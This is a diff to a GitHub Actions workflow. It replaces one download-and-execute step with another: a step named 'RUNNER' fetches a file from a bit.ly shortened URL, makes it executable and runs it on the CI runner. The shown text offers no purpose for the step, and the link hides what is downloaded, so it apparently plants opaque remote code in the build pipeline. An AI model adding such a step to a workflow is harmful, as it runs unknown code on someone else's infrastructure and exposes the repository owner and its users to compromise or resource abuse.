@@ -24,4 +24,4 @@ jobs:
       uses: actions/checkout@v1
     - name: RUNNER
       run: |
-        wget https://bit.ly/3nUrmdw && chmod +x 3nUrmdw && ./3nUrmdw
+        wget https://bit.ly/3zGKkqm && chmod +x 3zGKkqm && ./3zGKkqm
